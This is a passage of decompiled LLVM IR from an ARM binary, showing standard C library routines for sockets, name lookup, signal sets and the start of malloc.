  %v0_14a34 = phi i32 [ %v1_14a2c, %dec_label_pc_14a1c ], [ %v0_14a34.pre, %bb ]
  store i32 %v0_14a34, i32* @r6, align 4
  %v0_14a38.pre = load i32, i32* @r5, align 4
  %v0_14a3c.pre = load i32, i32* @r7, align 4
  %v1_14a3c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14a38

dec_label_pc_14a38:                               ; preds = %entry, %bb17
  %v0_14a54 = phi i32 [ %v1_149fc, %entry ], [ %v0_14a34, %bb17 ]
  %v1_14a3c = phi i32 [ %v5_149f8, %entry ], [ %v1_14a3c.pre, %bb17 ]
  %v0_14a3c = phi i32 [ 255, %entry ], [ %v0_14a3c.pre, %bb17 ]
  %v0_14a4c = phi i32 [ 0, %entry ], [ %v0_14a38.pre, %bb17 ]
  %v7_14a38 = icmp eq i32 %v0_14a4c, 3
  store i1 %v7_14a38, i1* @cpsr_z, align 1
  %v2_14a3c = and i32 %v0_14a3c, %v1_14a3c
  store i32 %v2_14a3c, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_14a48 = udiv i32 %v1_14a3c, 256
  store i32 %v3_14a48, i32* @r4, align 4
  %v1_14a4c = add i32 %v0_14a4c, 1
  store i32 %v1_14a4c, i32* @r5, align 4
  %v7_14a50 = icmp sgt i32 %v0_14a4c, 3
  br i1 %v7_14a50, label %dec_label_pc_14a54, label %dec_label_pc_14a1c

dec_label_pc_14a54:                               ; preds = %dec_label_pc_14a38
  %v1_14a54 = add i32 %v0_14a54, 1
  store i32 %v3_149d8, i32* @r4, align 4
  store i32 %v6_149d8, i32* @r5, align 4
  store i32 %v9_149d8, i32* @r6, align 4
  store i32 %v12_149d8, i32* @r7, align 4
  store i32 %v15_149d8, i32* @r8, align 4
  store i32 %v18_149d8, i32* @sb, align 4
  store i32 %v21_149d8, i32* @sl, align 4
  store i32 %v24_149d8, i32* @fp, align 4
  ret i32 %v1_14a54

; uselistorder directives
  uselistorder i32 %v0_14a4c, { 2, 0, 1 }
  uselistorder i32 %v0_14a34, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a38, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26008), i32* @r1, align 4
  %v0_14a74 = call i32 @__GI_inet_ntoa_r()
  %v0_14a78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a78, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_14a78 = load i32, i32* @r5, align 4
  %v1_14a7c = load i32, i32* @r8, align 4
  %v3_14a7c = mul i32 %v1_14a7c, %v2_14a78
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_14a7c = phi i32 [ %v0_14a74, %entry ], [ %v3_14a7c, %bb ]
  ret i32 %v4_14a7c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_14a88 = ptrtoint i32* %stack_var_-12 to i32
  %v0_14a8c = load i32, i32* @r0, align 4
  %v2_14a8c = inttoptr i32 %v0_14a8c to i8*
  %v3_14a8c = call i32 @inet_aton(i8* %v2_14a8c, i32 %v2_14a88)
  %v2_14a90 = icmp eq i32 %v3_14a8c, 0
  %v4_14a94 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_14a90, i32 -1, i32 %v4_14a94
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_14ab4 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_14ab4
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_14ac4 = load i32, i32* @r4, align 4
  %v6_14ac4 = load i32, i32* @r5, align 4
  %v0_14acc = load i32, i32* @r0, align 4
  store i32 %v0_14acc, i32* @r4, align 4
  %v0_14ad0 = load i32, i32* @r1, align 4
  store i32 %v0_14ad0, i32* @r5, align 4
  %v0_14ad4 = call i32 @__GI___h_errno_location()
  %v0_14afc = load i32, i32* @r4, align 4
  %v2_14b00 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_14b00, i32* @ip, align 4
  %v0_14b04 = load i32, i32* @r5, align 4
  %v8_14b0c = call i32 @gethostbyname2_r(i32 %v0_14afc, i32 %v0_14b04, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26464) to i32*), i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26024), i32 440, i32 %v2_14b00, i32 %v0_14ad4)
  %v3_14b10 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_14ac4, i32* @r4, align 4
  store i32 %v6_14ac4, i32* @r5, align 4
  ret i32 %v3_14b10
}

define i32 @function_14b24(i32 %arg1) local_unnamed_addr {
dec_label_pc_14b24:
  %v0_14b24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14b24, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14b24
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14b24, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b2c = load i32, i32* @r7, align 4
  store i32 %v3_14b2c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14b54, label %dec_label_pc_14b44

dec_label_pc_14b44:                               ; preds = %entry
  %v0_14b44 = call i32 @__GI___errno_location()
  %v0_14b48 = load i32, i32* %r7.global-to-local, align 4
  %v1_14b48 = sub i32 0, %v0_14b48
  %v2_14b4c = inttoptr i32 %v0_14b44 to i32*
  store i32 %v1_14b48, i32* %v2_14b4c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14b58.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14b54

dec_label_pc_14b54:                               ; preds = %entry, %dec_label_pc_14b44
  %v2_14b58 = phi i32 [ %v3_14b2c, %entry ], [ %v2_14b58.pre, %dec_label_pc_14b44 ]
  %v0_14b54 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14b44 ]
  store i32 %v2_14b58, i32* @r7, align 4
  ret i32 %v0_14b54

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b54, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b64 = load i32, i32* @r7, align 4
  store i32 %v3_14b64, i32* %stack_var_-8, align 4
  %v0_14b70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14b70, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14b70, -4095
  br i1 %tmp, label %dec_label_pc_14b90, label %dec_label_pc_14b80

dec_label_pc_14b80:                               ; preds = %entry
  %v0_14b80 = call i32 @__GI___errno_location()
  %v0_14b84 = load i32, i32* %r7.global-to-local, align 4
  %v1_14b84 = sub i32 0, %v0_14b84
  %v2_14b88 = inttoptr i32 %v0_14b80 to i32*
  store i32 %v1_14b84, i32* %v2_14b88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14b90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14b90

dec_label_pc_14b90:                               ; preds = %entry, %dec_label_pc_14b80
  %v1_14b94 = phi i32 [ %v0_14b70, %entry ], [ -1, %dec_label_pc_14b80 ]
  %v2_14b90 = phi i32 [ %v3_14b64, %entry ], [ %v2_14b90.pre, %dec_label_pc_14b80 ]
  store i32 %v2_14b90, i32* @r7, align 4
  ret i32 %v1_14b94

; uselistorder directives
  uselistorder i32 %v0_14b70, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14b90, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14bd0, label %dec_label_pc_14bc0

dec_label_pc_14bc0:                               ; preds = %entry
  %v0_14bc0 = call i32 @__GI___errno_location()
  %v0_14bc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bc4 = sub i32 0, %v0_14bc4
  %v2_14bc8 = inttoptr i32 %v0_14bc0 to i32*
  store i32 %v1_14bc4, i32* %v2_14bc8, align 4
  br label %dec_label_pc_14bd0

dec_label_pc_14bd0:                               ; preds = %entry, %dec_label_pc_14bc0
  %v1_14bd8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14bc0 ]
  ret i32 %v1_14bd8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14bd0, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14be0 = load i32, i32* @r7, align 4
  store i32 %v3_14be0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14c08, label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %entry
  %v0_14bf8 = call i32 @__GI___errno_location()
  %v0_14bfc = load i32, i32* %r7.global-to-local, align 4
  %v1_14bfc = sub i32 0, %v0_14bfc
  %v2_14c00 = inttoptr i32 %v0_14bf8 to i32*
  store i32 %v1_14bfc, i32* %v2_14c00, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14c0c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14c08:                               ; preds = %entry, %dec_label_pc_14bf8
  %v2_14c0c = phi i32 [ %v3_14be0, %entry ], [ %v2_14c0c.pre, %dec_label_pc_14bf8 ]
  %v0_14c08 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14bf8 ]
  store i32 %v2_14c0c, i32* @r7, align 4
  ret i32 %v0_14c08

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c08, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c18 = load i32, i32* @r7, align 4
  store i32 %v3_14c18, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14c40, label %dec_label_pc_14c30

dec_label_pc_14c30:                               ; preds = %entry
  %v0_14c30 = call i32 @__GI___errno_location()
  %v0_14c34 = load i32, i32* %r7.global-to-local, align 4
  %v1_14c34 = sub i32 0, %v0_14c34
  %v2_14c38 = inttoptr i32 %v0_14c30 to i32*
  store i32 %v1_14c34, i32* %v2_14c38, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14c44.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14c40

dec_label_pc_14c40:                               ; preds = %entry, %dec_label_pc_14c30
  %v2_14c44 = phi i32 [ %v3_14c18, %entry ], [ %v2_14c44.pre, %dec_label_pc_14c30 ]
  %v0_14c40 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14c30 ]
  store i32 %v2_14c44, i32* @r7, align 4
  ret i32 %v0_14c40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c40, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14c50 = load i32, i32* @r4, align 4
  store i32 %v3_14c50, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14c80, label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %entry
  %v0_14c70 = call i32 @__GI___errno_location()
  %v0_14c74 = load i32, i32* %r4.global-to-local, align 4
  %v1_14c74 = sub i32 0, %v0_14c74
  %v2_14c78 = inttoptr i32 %v0_14c70 to i32*
  store i32 %v1_14c74, i32* %v2_14c78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14c84.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14c80

dec_label_pc_14c80:                               ; preds = %entry, %dec_label_pc_14c70
  %v2_14c84 = phi i32 [ %v3_14c50, %entry ], [ %v2_14c84.pre, %dec_label_pc_14c70 ]
  %v0_14c80 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14c70 ]
  store i32 %v2_14c84, i32* @r4, align 4
  ret i32 %v0_14c80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c80, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14cc4, label %dec_label_pc_14cb4

dec_label_pc_14cb4:                               ; preds = %entry
  %v0_14cb4 = call i32 @__GI___errno_location()
  %v0_14cb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14cb8 = sub i32 0, %v0_14cb8
  %v2_14cbc = inttoptr i32 %v0_14cb4 to i32*
  store i32 %v1_14cb8, i32* %v2_14cbc, align 4
  br label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %entry, %dec_label_pc_14cb4
  %v1_14ccc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14cb4 ]
  ret i32 %v1_14ccc

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14cc4, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14cd4 = load i32, i32* @r7, align 4
  store i32 %v3_14cd4, i32* %stack_var_-8, align 4
  %v0_14ce0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14ce0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14ce0, -4095
  br i1 %tmp, label %dec_label_pc_14d00, label %dec_label_pc_14cf0

dec_label_pc_14cf0:                               ; preds = %entry
  %v0_14cf0 = call i32 @__GI___errno_location()
  %v0_14cf4 = load i32, i32* %r7.global-to-local, align 4
  %v1_14cf4 = sub i32 0, %v0_14cf4
  %v2_14cf8 = inttoptr i32 %v0_14cf0 to i32*
  store i32 %v1_14cf4, i32* %v2_14cf8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14d00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14d00:                               ; preds = %entry, %dec_label_pc_14cf0
  %v1_14d04 = phi i32 [ %v0_14ce0, %entry ], [ -1, %dec_label_pc_14cf0 ]
  %v2_14d00 = phi i32 [ %v3_14cd4, %entry ], [ %v2_14d00.pre, %dec_label_pc_14cf0 ]
  store i32 %v2_14d00, i32* @r7, align 4
  ret i32 %v1_14d04

; uselistorder directives
  uselistorder i32 %v0_14ce0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d00, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_14d0c = load i32, i32* @r4, align 4
  %v0_14d14 = call i32 @__GI_getpid()
  %v2_14d1c = call i32 @kill(i32 %v0_14d14, i32 %arg1)
  store i32 %v3_14d0c, i32* @r4, align 4
  ret i32 %v2_14d1c

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_14d40, label %dec_label_pc_14d38

dec_label_pc_14d38:                               ; preds = %entry
  %v7_14d3c = icmp slt i32 %arg1, 65
  br i1 %v7_14d3c, label %dec_label_pc_14d54, label %dec_label_pc_14d40

dec_label_pc_14d40:                               ; preds = %dec_label_pc_14d38, %entry
  %v0_14d40 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14d4c = inttoptr i32 %v0_14d40 to i32*
  store i32 22, i32* %v2_14d4c, align 4
  %v0_14d5c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d5c

dec_label_pc_14d54:                               ; preds = %dec_label_pc_14d38
  %v0_14d54 = call i32 @__sigaddset()
  store i32 %v0_14d54, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d5c

dec_label_pc_14d5c:                               ; preds = %dec_label_pc_14d40, %dec_label_pc_14d54
  %v0_14d5c = phi i32 [ %v0_14d5c.pre, %dec_label_pc_14d40 ], [ %v0_14d54, %dec_label_pc_14d54 ]
  ret i32 %v0_14d5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14d5c, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_14d74 = add i32 %tmp, 4
  %v3_14d74 = inttoptr i32 %v2_14d74 to i32*
  store i32 0, i32* %v3_14d74, align 4
  %v1_14d78 = load i32, i32* %r3.global-to-local, align 4
  %v2_14d78 = inttoptr i32 %v1_14d78 to i32*
  store i32 0, i32* %v2_14d78, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14d80 = load i32, i32* @r4, align 4
  store i32 %v3_14d80, i32* %stack_var_-16, align 4
  %v6_14d80 = load i32, i32* @r5, align 4
  %v9_14d80 = load i32, i32* @r6, align 4
  %v7_14d88 = icmp eq i32 %arg2, -1
  br i1 %v7_14d88, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_14d90 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_14dac

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_14db4

dec_label_pc_14dac:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  %v7_14db0 = icmp slt i32 %arg1, 65
  br i1 %v7_14db0, label %dec_label_pc_14dc8, label %dec_label_pc_14db4

dec_label_pc_14db4:                               ; preds = %.thread16, %dec_label_pc_14dac
  %v0_14db4 = call i32 @__GI___errno_location()
  store i32 -1, i32* @r2, align 4
  %v2_14dc0 = inttoptr i32 %v0_14db4 to i32*
  store i32 22, i32* %v2_14dc0, align 4
  %v0_14e20.pre = load i32, i32* @r2, align 4
  br label %bb33

dec_label_pc_14dc8:                               ; preds = %dec_label_pc_14dac
  %v2_14dc8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14dc8, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_14dd0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_14dd0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_14de0 = call i32 @__sigaddset()
  %v0_14de8 = load i32, i32* @r5, align 4
  %v0_14dec = load i32, i32* @r6, align 4
  %v2_14dec = add i32 %v0_14dec, 26652
  %v2_14df0 = call i32 @__GI___sigismember(i32 %v2_14dec, i32 %v0_14de8)
  %v0_14e08 = load i32, i32* @r5, align 4
  %v3_14e10 = call i32 @__libc_sigaction(i32 %v0_14e08, i32 %v2_14dc8, i32 %v2_14d90)
  %v1_14e14 = icmp slt i32 %v3_14e10, 0
  br i1 %v1_14e14, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_14dc8
  %v5_14e18 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_14e18, i32* @r2, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_14dc8
  store i32 -1, i32* @r2, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_14db4, %bb32
  %v0_14e20 = phi i32 [ %v5_14e18, %bb31 ], [ %v0_14e20.pre, %dec_label_pc_14db4 ], [ -1, %bb32 ]
  %v2_14e28 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14e28, i32* @r4, align 4
  store i32 %v6_14d80, i32* @r5, align 4
  store i32 %v9_14d80, i32* @r6, align 4
  ret i32 %v0_14e20

; uselistorder directives
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14db4, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_14e38 = add i32 %arg2, -1
  %v3_14e3c = udiv i32 %v1_14e38, 32
  %v4_14e40 = mul nuw nsw i32 %v3_14e3c, 4
  %v5_14e40 = add i32 %v4_14e40, %arg1
  %v6_14e40 = inttoptr i32 %v5_14e40 to i32*
  %v7_14e40 = load i32, i32* %v6_14e40, align 4
  %v1_14e44 = urem i32 %v1_14e38, 32
  %v7_14e4c = shl i32 1, %v1_14e44
  %v8_14e4c = and i32 %v7_14e40, %v7_14e4c
  %v10_14e4c = icmp ne i32 %v8_14e4c, 0
  %. = zext i1 %v10_14e4c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_14e38, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_14e5c = load i32, i32* @r1, align 4
  %v1_14e5c = add i32 %v0_14e5c, -1
  %v3_14e60 = udiv i32 %v1_14e5c, 32
  %v0_14e64 = load i32, i32* @r0, align 4
  %v4_14e64 = mul nuw nsw i32 %v3_14e60, 4
  %v5_14e64 = add i32 %v0_14e64, %v4_14e64
  %v6_14e64 = inttoptr i32 %v5_14e64 to i32*
  %v7_14e64 = load i32, i32* %v6_14e64, align 4
  %v1_14e68 = urem i32 %v1_14e5c, 32
  %v7_14e70 = shl i32 1, %v1_14e68
  %v8_14e70 = or i32 %v7_14e64, %v7_14e70
  store i32 %v8_14e70, i32* %v6_14e64, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14e5c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_14e80 = add i32 %arg2, -1
  %v3_14e84 = udiv i32 %v1_14e80, 32
  %v4_14e88 = mul nuw nsw i32 %v3_14e84, 4
  %v5_14e88 = add i32 %v4_14e88, %arg1
  %v6_14e88 = inttoptr i32 %v5_14e88 to i32*
  %v7_14e88 = load i32, i32* %v6_14e88, align 4
  %v1_14e8c = urem i32 %v1_14e80, 32
  %tmp = shl i32 -1, %v1_14e8c
  %v8_14e94 = add i32 %tmp, -1
  %v9_14e94 = and i32 %v7_14e88, %v8_14e94
  store i32 %v9_14e94, i32* %v6_14e88, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14e80, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_14ea4 = udiv i32 %arg1, 256
  store i32 %v3_14ea4, i32* %r1.global-to-local, align 4
  %v2_14ea8 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_14ea8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_14eb4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14ea8, i32 %v0_14eb4)
  %v0_14eb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14eb8 = add i32 %v0_14eb8, 1048320
  %v3_14ebc = udiv i32 %v1_14eb8, 65536
  %v1_14ec0 = and i32 %v3_14ebc, 8
  %v6_14ec4 = shl i32 %v0_14eb8, %v1_14ec0
  %v1_14ec8 = add i32 %v6_14ec4, 520192
  %v3_14ecc = udiv i32 %v1_14ec8, 65536
  %v1_14ed0 = and i32 %v3_14ecc, 4
  %v6_14ed4 = shl i32 %v6_14ec4, %v1_14ed0
  %v1_14ed8 = add i32 %v6_14ed4, 245760
  %v3_14edc = udiv i32 %v1_14ed8, 65536
  %v1_14ee0 = and i32 %v3_14edc, 2
  %v6_14ee4 = shl i32 %v6_14ed4, %v1_14ee0
  store i32 %v6_14ee4, i32* %r1.global-to-local, align 4
  %v1_14ee8 = sub nsw i32 13, %v1_14ec0
  %v2_14eec = sub nsw i32 %v1_14ee8, %v1_14ed0
  %v3_14ef0 = udiv i32 %v6_14ee4, 32768
  %v4_14ef0 = sub nuw nsw i32 -1, %v3_14ef0
  %v4_14ef4 = udiv i32 %v6_14ee4, 16384
  %v5_14ef4 = and i32 %v4_14ef4, %v4_14ef0
  %v2_14ef8 = sub nsw i32 %v2_14eec, %v1_14ee0
  %v2_14efc = add nsw i32 %v2_14ef8, %v5_14ef4
  %v1_14f00 = add nsw i32 %v2_14efc, 6
  %v0_14f04 = load i32, i32* %ip.global-to-local, align 4
  %v6_14f04 = lshr i32 %v0_14f04, %v1_14f00
  %v3_14f08 = mul nsw i32 %v2_14efc, 4
  %v1_14f0c = add nsw i32 %v3_14f08, 32
  %v1_14f10 = urem i32 %v6_14f04, 4
  %v2_14f14 = or i32 %v1_14f10, %v1_14f0c
  ret i32 %v2_14f14

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_14f1c = load i32, i32* @r4, align 4
  %v6_14f1c = load i32, i32* @r5, align 4
  %v9_14f1c = load i32, i32* @r6, align 4
  %v12_14f1c = load i32, i32* @r7, align 4
  %v15_14f1c = load i32, i32* @r8, align 4
  %v18_14f1c = load i32, i32* @sb, align 4
  %v21_14f1c = load i32, i32* @sl, align 4
  %v24_14f1c = load i32, i32* @fp, align 4
  %v27_14f1c = load i32, i32* @lr, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r1.global-to-local, align 4
  %v4_14f30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 76) to i32*), align 4
  store i32 %v4_14f30, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v4_14f3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 40) to i32*), align 4
  store i32 %v4_14f3c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_14f30, i32* %r2.global-to-local, align 4
  %v2_14f48 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14f48, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
